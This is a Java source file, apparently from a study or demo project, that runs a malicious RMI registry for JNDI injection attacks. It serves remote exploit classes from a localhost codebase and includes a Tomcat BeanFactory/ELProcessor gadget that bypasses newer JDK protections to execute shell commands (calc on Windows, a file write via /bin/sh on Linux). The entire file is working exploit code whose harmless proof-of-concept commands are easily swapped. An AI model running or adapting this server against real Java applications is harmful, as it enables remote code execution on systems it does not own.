import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Arrays;

/**
 * 类名:JNDIExploitServer <br/>
 * 描述:jndi注入服务端 <br/>
 * 时间:2021/12/12 21:26 <br/>
 *
 * @author lanhaifeng
 * @version 1.0
 */
public class JNDIExploitServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException, MalformedURLException {
        remoteClass();
    }

    public static void remoteClass() throws RemoteException, NamingException, AlreadyBoundException {
        //创建Registry
        Registry registry = LocateRegistry.createRegistry(1099);

        String url = "http://127.0.0.1:8080/";
        // 实例化一个Reference尝试为远程对象构造一个引用
        // com.feng.baseframework.jndi.ExploitObject如果存在包路径，factory需要使用完整路径，同时web下也创建相同层级目录
        Reference reference = new Reference("ExploitObject", "ExploitObject", url);
        // 强转成ReferenceWrapper，因为Reference并没有继承Remote接口，不能直接注册到Registry中
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

        registry.bind("ExportObject", referenceWrapper);

        registry.bind("ExportLinuxObject", new ReferenceWrapper(new Reference("ExploitLinuxObject", "ExploitLinuxObject", url)));

        //利用本地代码tomcat库触发漏洞，从而绕开jdk高版本限制，要求classpath下有BeanFactory和ELProcessor存在
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        // 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码
        ref.add(new StringRefAddr("forceString", "x=eval"));

        // 利用表达式执行命令
        String OS = System.getProperty("os.name").toLowerCase();
        if(OS.contains("windows")){
            ref.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"calc\")"));
        }
        if(OS.contains("linux")){
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','echo test>/tmp/Exploit.txt']).start()\")"));
        }

        ReferenceWrapper referenceLinuxWrapper = new ReferenceWrapper(ref);

        registry.bind("ExportLocalFactoryObject", referenceLinuxWrapper);

        //实现接口方式，本地提供远程代码
        ExploitLocalObject exploitLocalObject = new ExploitLocalObject();
        registry.rebind("ExportLocalObject", exploitLocalObject);

        System.out.println("Registry&Server Start ...");
        //打印别名
        System.out.println("Registry List: " + Arrays.toString(registry.list()));
    }

}
